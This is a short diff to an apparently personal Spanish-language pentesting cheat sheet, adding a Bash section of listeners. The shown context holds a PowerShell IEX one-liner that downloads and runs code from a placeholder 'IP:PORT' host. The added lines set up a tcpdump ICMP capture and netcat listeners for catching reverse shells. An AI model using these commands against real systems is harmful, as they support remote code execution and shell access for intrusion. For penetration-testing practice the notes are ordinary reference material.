@@ -19,6 +19,22 @@ Descargar binarios
 ```
 powershell IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/binario.binario')
 ```
+# Bash
+
+## Listeners
+
+Listener paquetes ICMP
+```
+tcpdump -i NETINTERFACE icmp -n
+```
+Listener shell nc
+```
+nc -lvnp PORT
+```
+Listener shell chetado
+```
+rlwrap nc -lvnp PORT
+```
 
 # PostExplotacion
 
